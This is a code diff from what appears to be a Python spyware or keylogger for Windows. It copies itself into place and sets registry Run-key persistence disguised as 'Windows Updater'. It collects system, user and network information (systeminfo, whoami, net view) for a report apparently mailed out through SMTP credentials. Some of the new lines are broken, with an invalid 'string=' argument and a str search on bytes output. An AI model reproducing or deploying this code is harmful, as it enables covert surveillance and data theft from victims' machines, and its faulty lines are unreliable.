@@ -38,7 +38,7 @@ def startup():
 	if not os.path.exists(dirapp): 
 		shutil.copyfile(sys.executable , dirapp);
 	
-	regquery = os.popen('reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "Windows Updater"').read()
+	regquery = subprocess.check_output('reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "Windows Updater"',shell=True,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL)
 	if regquery.find(dirapp) < 0:
 		subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "Windows Updater" /t REG_SZ /d "' + dirapp + '"', shell=True)
 		#os.popen("cmd.exe /c " + dirapp)
@@ -46,7 +46,7 @@ def startup():
 def checklog(gserver , gport , guser , gpass , mailfrom,  mailto, subject):
 	global logdata,timereport,interval,firstreport
 	if firstreport == 0 :
-		logdata = os.popen('systeminfo & whoami & net view').read()
+		logdata = subprocess.check_output('systeminfo & whoami & net view', shell=True,stderr=subprocess.DEVNULL,string=subprocess.DEVNULL)
 		firstreport = 1
 	timereport = time.ctime()
 	while True:
